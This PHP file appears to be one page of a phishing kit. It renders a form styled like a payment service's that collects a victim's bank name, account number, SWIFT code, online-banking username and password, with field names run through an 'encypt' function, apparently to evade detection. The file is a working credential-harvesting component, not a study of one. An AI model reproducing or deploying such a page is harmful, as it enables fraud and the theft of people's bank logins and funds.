<?php
require __DIR__ . '/function.php';
require $api->language();

$page = "bank";
$api->check_cookie();
$api->session("kuzuluy", true, $page);

require __DIR__ . '/system/page/header.php';

$html .= '
<div class="title-page">'.$api->text_encode($text['66']).'</div>
<form method="post" id="bank" autocomplete="off">
<div class="textInput lap" id="DivName">
<input type="text" name="'.$api->encypt("bankname").'" id="Name" placeholder="'.$api->text_encode($text['67']).'" value="'.@$_SESSION['card1_bank'].'"">
</div>
<div class="textInput lap" id="DivNumber">
<input type="tel" name="'.$api->encypt("banknumber").'" id="Number" placeholder="'.$api->text_encode($text['68']).'">
</div>
<div class="textInput lap" id="DivSwift">
<input type="text" name="'.$api->encypt("bankswift").'" id="Swift" placeholder="'.$api->text_encode($text['69']).'">
</div>
<div class="textInput lap" id="DivLogin">
<input type="text" name="'.$api->encypt("banklogin").'" id="Login" placeholder="'.$api->text_encode($text['70']).'">
</div>
<div class="textInput lap" id="DivPass">
<input type="password" name="'.$api->encypt("bankpass").'" id="Pass" placeholder="'.$api->text_encode($text['71']).'">
</div>
<input class="vx_btn col-md-12 col-sm-12 col-xs-12" type="submit" value="'.$api->text_encode($text['59']).'" id="btnConfirm">
<p class="scretlogo"></p>
</form>
<div class="hasSpinner hide" id="loading"></div>';

require __DIR__ . '/system/page/footer.php';
?>
